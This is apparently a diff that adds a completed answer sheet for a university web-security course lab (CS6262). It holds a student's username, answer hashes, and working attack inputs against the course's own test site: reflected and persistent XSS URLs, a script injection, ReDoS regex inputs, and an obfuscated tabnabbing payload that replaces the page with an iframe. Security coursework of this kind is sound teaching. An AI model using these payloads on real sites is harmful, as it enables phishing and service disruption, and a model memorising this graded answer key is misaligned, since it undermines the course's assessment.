@@ -1,0 +1,200 @@
+Assignment Questionnaire
+========================
+
+NOTE: DO NOT DELETE --> and <--, and place your answers within the marks.
+  Example:
+    -->
+      https://cs6262.gtisc.gatech.edu
+    <--
+
+
+Info
+====
+
+Example:
+  Your GT Username: kpark21
+
+-->username
+  Your Username: skhadka9
+<--
+
+Task 1 (5%)
+=======
+
+1. Which of the following options can adjust iframe’s width and height correctly?
+  A. <iframe src=”https://gatech.edu” width=”100%” height=”100%”></iframe>
+  B. <iframe src=”https://gatech.edu” width=”100px” height=”100px”></iframe>
+  C. <iframe src=”https://gatech.edu” style=”width:100%;height:100%”></iframe>
+  D. All of above
+
+Example:
+  Answer: A
+
+-->task_1_1
+  Answer: D
+<--
+
+2. In order for the <a> tag to open a new tab/window when clicked, what value should you set for the target attribute? 
+(The answer should only contain the value itself). This is necessary for task 5.3.
+
+Example:
+  Answer: something
+
+-->task_1_2
+  Answer: _blank
+<--
+
+3. You will see three alerts after running the code below. What numbers you will see in sequence?
+The answer should be 3 numbers separated by commas with no space, e.g. 1,1,1. 
+Think about why that is the case. You will use this technique in task 5.2.
+
+for (var i = 0; i < 3; i++) {
+  const promise = new Promise((resolve, reject) => {
+        setTimeout(resolve, 1000 + i*1000)
+  });
+  promise.then(() => alert(i));
+}
+
+Example:
+  Answer: 1,1,1
+
+-->task_1_3
+  Answer: 3,3,3
+<--
+
+4. Which of the following can set jsScript to string correctly? Understanding how HTML code is parsed is important.
+This question is related to task 3.
+  A  <script>let jsScript=<script>a=2</script></script>
+  B  <script>let jsScript='<script>a=2</script>'</script>
+  C  <script>let jsScript='<script>a=2<\/script>'</script>
+  D  None of above
+
+Example:
+  Answer: A
+
+-->task_1_4
+  Answer: C
+<--
+
+5. Fetch is an api which makes use of promises to send web requests. It is supported by most major web browsers.
+Study the use of fetch api and try to make a POST request to your Message Receiver Endpoint with payload body being {username: your-GT-username}, e.g. {username: abc123}. 
+What is the hash string you get after POSTing to your endpoint?
+
+Example:
+  Answer: ahashstring1235...
+
+-->task_1_5
+  Answer: 2f380f7084110e1e3bd3d7fda801691987f77eecc6ff3d8bcd10062176cb385c5c4c6c5f6cd23f32b341d3eae5ca2b6702aa4dbe8447ed82a1a9dd6348b1a677
+<--
+
+Task 2  (10%)
+=======
+
+1. What is the URL that you can use to exploit the reflected-XSS vulnerability?
+
+Example:
+  URL: https://cs6262.gtisc.gatech.edu/vulnerable/endpoint/?payload
+
+-->task_2
+  URL: https://cs6262.gtisc.gatech.edu/search?keyword=<script>alert(%27reflected-XSS%20vulnerability%27);</script>
+<--
+
+
+Task 3  (15%)
+=======
+
+1. What is the URL that you can use to exploit the persistent-client XSS vulnerability?
+
+Example:
+  URL: https://cs6262.gtisc.gatech.edu/vulnerable/endpoint/?payload
+
+-->task_3
+  URL: https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3ElocalStorage.setItem("cs6262-web-security-user-theme",%20%27https://bootswatch.com/4/%3Cscript%3Ealert(\%27Persistent%20Client%20Side%20XSS\%27);%3C\/script%3Ecyborg/bootstrap.min.css%27);%3C/script%3E
+<--
+
+
+Task 4 (20%)
+=======
+
+1. What is the hash string you get as admin 
+
+Example:
+  Hash: 0c307979...
+
+-->task_4_1
+  Hash: 7b6b1048db1764f6f12081e7832d3e03183a68aa084a1eb96fc2404ef6e033b7080b153cd2dc86239b0595f1596ee94b741716fdd28da27bb837bd84c4595e2d
+<--
+
+2. What is the endpoint to retrive the hash?
+Example:
+  URL: https://cs6262.gtisc.gatech.edu/vulnerable/endpoint
+
+-->task_4_2
+  URL: https://cs6262.gtisc.gatech.edu/session-hijacking/skhadka9
+<--
+
+3. Your injected payload. The whole thing you submitted to the backend.
+It's ok to put it in multi-lines.
+
+Example:
+  Payload : whatever <script>
+  your code
+  </script> whatever
+
+-->task_4_3
+  Payload: <script>
+  window.gotYou=true
+  </script>
+<--
+
+
+Task 5 (45%)
+=======
+
+1.1 What is the hash string you see by a successful ReDoS attack?
+
+Example:
+  Hash: fdsaf23vcx3r23...
+
+-->task_5_1_1
+  Hash: 4a8d9450aa60610e70aecd087a794f7697d668c6f6f32863587915108f66a14c20fd239ed29618f9f3f0e60d13c661fc906df888ef6ee66ef21cbaff769e4d6b
+<--
+
+1.2. What is the username and password used for such a ReDoS attack?
+
+Example:
+  Username: user
+  Password: password
+
+-->task_5_1_2
+  Username: ^(a+)+$
+  Password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+<--
+
+2. What are the local web server's IP addresses? Report them in the format of
+ip1,ip2,ip3,...
+
+Example:
+  IP Addresses: 123.123.123.1,123.123.123.2,...
+
+-->task_5_2
+  IP Addresses: 172.16.238.58,172.16.238.97,172.16.238.128,172.16.238.138,172.16.238.243
+<--
+
+3.1 What is the URL you used to launch a tabnabbing attack?
+
+Example:
+  URL: https://cs6262.gtisc.gatech.edu/vulnerable/endpoint/?payload
+
+-->task_5_3_1
+  URL: https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3E!function()%7Bdocument.querySelectorAll(%22a%22).forEach(function(t)%7Bt.setAttribute(%22target%22%2C%22_blank%22)%2Ct.addEventListener(%22click%22%2Cfunction(t)%7Bt.preventDefault()%3Blet%20e%3Dthis.href%2Cn%3Ddocument.createElement(%22a%22)%3Bn.setAttribute(%22href%22%2Ce)%2Cn.setAttribute(%22target%22%2C%22_blank%22)%2Cn.click()%7D)%7D)%3Bvar%20t%2Ce%3D0%3Bdocument.addEventListener(%22visibilitychange%22%2Cfunction()%7Bdocument.hidden%3Ft%3DsetInterval(function()%7Bif((e%2B%3D1e3)%3E%3D6e4)%7Bdocument.body.innerHTML%3D%22%22%3Bvar%20n%3Ddocument.createElement(%22iframe%22)%3Bn.setAttribute(%22src%22%2C%22https%3A%2F%2Fcs6262.gtisc.gatech.edu%2Ftabnabbing%2Fskhadka9%22)%2Cn.style.width%3D%22100%25%22%2Cn.style.height%3D%22100%25%22%2Cn.style.border%3D%22none%22%2Cdocument.body.appendChild(n)%2CclearInterval(t)%7D%7D%2C1e3)%3A(clearInterval(t)%2Ce%3D0)%7D)%7D()%3B%3C%2Fscript%3E
+<--
+
+3.2 What is the hash string you see by a successful tabnabbing attack?
+
+Example:
+  Hash: fdsaf23vcx3r23...
+
+-->task_5_3_2
+  Hash: 57ed45b63a3d58c572c7ace90dfa287be52d3b818dd331b0394f6d276c5b20bc5b0bf1e60342b8122cfdaa52fc64b1b30826f7c093f83c4b82a9920481c28031
+<--
